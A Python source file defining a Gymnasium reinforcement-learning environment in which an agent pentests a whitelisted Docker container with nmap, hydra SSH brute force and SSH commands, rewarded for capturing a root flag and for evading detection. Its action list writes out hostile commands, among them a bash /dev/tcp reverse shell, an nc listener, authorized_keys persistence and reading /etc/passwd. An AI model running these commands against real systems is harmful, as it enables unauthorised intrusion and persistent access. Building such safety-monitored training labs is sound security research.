"""
Real Linux Environment - Gymnasium environment using actual pentesting tools

This environment executes real commands against Docker containers instead of simulation.
"""

import gymnasium as gym
from gymnasium import spaces
import numpy as np
import random
from typing import Tuple, Dict
import logging

from tools.tool_executor import ToolExecutor
from tools.output_parser import OutputParser
from safety.monitor import get_safety_monitor

class RealLinuxEnv(gym.Env):
    """
    Real pentesting environment using actual tools
    
    Executes real nmap, hydra, SSH commands against Docker containers.
    Maintains same action space as LinuxSecEnv for compatibility.
    """
    
    metadata = {'render_modes': ['human']}
    
    def __init__(self, target_ip: str = "172.20.0.10"):
        """
        Initialize real environment
        
        Args:
            target_ip: Target Docker container IP (must be whitelisted)
        """
        super(RealLinuxEnv, self).__init__()
        
        self.target_ip = target_ip
        self.safety = get_safety_monitor()
        self.parser = OutputParser()
        self.logger = logging.getLogger(__name__)
        
        # Validate target
        if not self.safety.validate_target_ip(target_ip):
            raise ValueError(f"Target IP {target_ip} not in whitelist!")
        
        # Initialize tool executor
        self.executor = ToolExecutor(target_ip)
        
        # ACTION SPACE - Same as LinuxSecEnv for compatibility
        self.actions = [
            "nmap -sV target",          # 0: Port Scan
            "enum4linux target",        # 1: SMB Enum (simulated)
            "gobuster dir -u target",   # 2: Dir Busting (simulated)
            "cat /etc/passwd",          # 3: Read Users
            "ps aux",                   # 4: Process List
            
            "hydra -l admin -P rockyou",# 5: Brute Force SSH
            "exploit_buffer_overflow",  # 6: Binary Exploit (simulated)
            "exploit_cve_2025_1234",    # 7: Kernel Exploit (simulated)
            "bash -i >& /dev/tcp/IP/PORT 0>&1", # 8: Reverse Shell (simulated)
            "python -c 'import socket...'",     # 9: Reverse Shell (simulated)
            
            "sudo -l",                  # 10: Check Sudo Rights
            "find / -perm -4000",       # 11: Find SUID Binaries
            "cat /root/flag.txt",       # 12: Read Root Flag
            "linpeas.sh",               # 13: Auto Enum Script (simulated)
            "dirty_cow_exploit",        # 14: PrivEsc Exploit (simulated)
            
            "echo 'ssh-rsa ...' >> .ssh/authorized_keys", # 15: SSH Persistence
            "nc -lvnp 4444",            # 16: Listen for Callback
            "whoami",                   # 17: Check Identity
            "history",                  # 18: Check History
            "wait",                     # 19: Wait/Sleep
        ]
        
        self.action_space = spaces.Discrete(len(self.actions))
        
        # OBSERVATION SPACE - Enhanced for real environment
        # [access_level, ports_found, vuln_found, shell_active, alert_level, 
        #  ssh_open, http_open, creds_found, privilege_level]
        self.observation_space = spaces.Box(
            low=0, high=2, shape=(9,), dtype=np.float32
        )
        
        # State tracking
        self.access_level = 0  # 0=None, 1=User, 2=Root
        self.ports_found = 0
        self.vuln_found = 0
        self.shell_active = 0
        self.alert_level = 0
        self.steps = 0
        self.max_steps = 50
        
        # Real environment state
        self.discovered_ports = []
        self.discovered_services = {}
        self.credentials = {}
        self.current_user = None
        self.current_password = None
        
        self.logger.info(f"RealLinuxEnv initialized for target {target_ip}")
    
    def reset(self, seed=None, options=None):
        """Reset environment for new episode"""
        super().reset(seed=seed)
        
        # Reset state
        self.access_level = 0
        self.ports_found = 0
        self.vuln_found = 0
        self.shell_active = 0
        self.alert_level = 0
        self.steps = 0
        
        self.discovered_ports = []
        self.discovered_services = {}
        self.credentials = {}
        self.current_user = None
        self.current_password = None
        
        # Reset safety monitor episode counters
        self.safety.reset_episode()
        
        # Check target connectivity
        if not self.executor.check_connectivity():
            self.logger.warning(f"Target {self.target_ip} may not be reachable")
        
        self.logger.info("Environment reset")
        return self._get_obs(), {}
    
    def step(self, action_id: int):
        """Execute action and return observation"""
        if self.safety.is_kill_switch_active():
            self.logger.error("Kill switch active - terminating episode")
            return self._get_obs(), -100.0, True, False, {"error": "Kill switch active"}
        
        self.steps += 1
        action_name = self.actions[action_id]
        
        reward = -1.0  # Time penalty
        done = False
        truncated = False
        info = {"action": action_name, "target": self.target_ip}
        
        # Execute action based on ID
        success, output = self._execute_action(action_id)
        
        info["output"] = self.parser.summarize_output(output)
        info["success"] = success
        
        # Calculate reward based on action outcome
        reward += self._calculate_reward(action_id, success, output)
        
        # Update state based on action results
        self._update_state(action_id, success, output)
        
        # Check termination conditions
        if self.access_level == 2 and "flag" in output.lower():
            reward += 500.0
            done = True
            info["output"] = "🎉 ROOT FLAG CAPTURED!"
        
        if self.alert_level >= 2:
            reward -= 50.0
            done = True
            info["output"] = "🚨 DETECTED! Mission failed."
        
        if self.steps >= self.max_steps:
            truncated = True
        
        return self._get_obs(), reward, done, truncated, info
    
    def _execute_action(self, action_id: int) -> Tuple[bool, str]:
        """Execute the actual pentesting action"""
        
        # RECON PHASE
        if action_id == 0:  # nmap
            return self.executor.execute_nmap("-sV -p-")
        
        elif action_id == 1:  # enum4linux (simulated)
            return True, "[SIMULATED] enum4linux not implemented yet"
        
        elif action_id == 2:  # gobuster (simulated)
            return True, "[SIMULATED] gobuster not implemented yet"
        
        # EXPLOITATION PHASE
        elif action_id == 5:  # Hydra SSH brute force
            return self.executor.execute_hydra(port=2222, username="admin")
        
        elif action_id in [6, 7]:  # Exploits (simulated)
            return True, "[SIMULATED] Exploit framework not implemented yet"
        
        elif action_id in [8, 9]:  # Reverse shells (simulated)
            if self.access_level >= 1:
                return True, "Reverse shell connection established"
            return False, "No access to establish shell"
        
        # POST-EXPLOITATION (requires credentials)
        elif action_id in [3, 4, 10, 11, 12, 17, 18]:
            if self.current_user and self.current_password:
                command = self.actions[action_id].split()[0]  # Extract base command
                return self.executor.execute_ssh_command(
                    self.actions[action_id],
                    self.current_user,
                    self.current_password,
                    port=2222
                )
            else:
                return False, "No credentials available for SSH"
        
        # OTHER ACTIONS
        elif action_id == 19:  # Wait
            return True, "Waiting..."
        
        else:
            return True, f"[SIMULATED] Action {action_id} not fully implemented"
    
    def _calculate_reward(self, action_id: int, success: bool, output: str) -> float:
        """Calculate reward based on action outcome"""
        reward = 0.0
        
        if not success:
            return -5.0  # Penalty for failed actions
        
        # RECON rewards
        if action_id == 0:  # nmap
            parsed = self.parser.parse_nmap_output(output)
            num_ports = len(parsed["open_ports"])
            if num_ports > 0 and self.ports_found == 0:
                reward += 10.0 + (num_ports * 2.0)  # Bonus for finding ports
        
        # EXPLOITATION rewards
        elif action_id == 5:  # Hydra
            parsed = self.parser.parse_hydra_output(output)
            if parsed["success"] and len(self.credentials) == 0:
                reward += 50.0  # Major reward for finding credentials
        
        elif action_id in [8, 9]:  # Reverse shell
            if self.shell_active == 0:
                reward += 30.0
        
        # POST-EXPLOITATION rewards
        elif action_id == 10:  # sudo -l
            if "NOPASSWD" in output:
                reward += 20.0  # Found privilege escalation path
        
        elif action_id == 12:  # cat flag
            if "flag" in output.lower() or "ctf{" in output.lower():
                reward += 100.0  # Found flag
        
        return reward
    
    def _update_state(self, action_id: int, success: bool, output: str):
        """Update environment state based on action results"""
        
        if not success:
            self.alert_level += 0.5  # Failed actions increase detection risk
            return
        
        # Update from nmap
        if action_id == 0:
            parsed = self.parser.parse_nmap_output(output)
            if parsed["open_ports"]:
                self.ports_found = 1
                self.discovered_ports = parsed["open_ports"]
                self.discovered_services = parsed["services"]
        
        # Update from Hydra
        elif action_id == 5:
            parsed = self.parser.parse_hydra_output(output)
            if parsed["credentials_found"]:
                cred = parsed["credentials_found"][0]
                self.credentials[cred["username"]] = cred["password"]
                self.current_user = cred["username"]
                self.current_password = cred["password"]
                self.access_level = 1  # Gained user access
        
        # Update from reverse shell
        elif action_id in [8, 9]:
            if self.access_level >= 1:
                self.shell_active = 1
        
        # Update from sudo -l
        elif action_id == 10:
            parsed = self.parser.parse_ssh_output(output, self.actions[action_id])
            if parsed["indicators"].get("sudo_nopasswd"):
                self.vuln_found = 1  # Found privilege escalation path
        
        # Update from privilege escalation
        elif action_id == 14:  # dirty_cow or similar
            if self.vuln_found == 1:
                self.access_level = 2  # Gained root
    
    def _get_obs(self):
        """Get current observation"""
        # Enhanced observation with real tool data
        ssh_open = 1.0 if 22 in self.discovered_ports or 2222 in self.discovered_ports else 0.0
        http_open = 1.0 if any(p in self.discovered_ports for p in [80, 443, 8080]) else 0.0
        creds_found = 1.0 if self.credentials else 0.0
        privilege = float(self.access_level) / 2.0  # Normalize to 0-1
        
        return np.array([
            self.access_level,
            self.ports_found,
            self.vuln_found,
            self.shell_active,
            self.alert_level,
            ssh_open,
            http_open,
            creds_found,
            privilege
        ], dtype=np.float32)
    
    def render(self, mode='human'):
        """Render environment state"""
        if mode == 'human':
            print(f"\n{'='*50}")
            print(f"Target: {self.target_ip}")
            print(f"Step: {self.steps}/{self.max_steps}")
            print(f"Access Level: {['None', 'User', 'Root'][self.access_level]}")
            print(f"Open Ports: {self.discovered_ports}")
            print(f"Credentials: {list(self.credentials.keys())}")
            print(f"Alert Level: {self.alert_level}")
            print(f"{'='*50}\n")
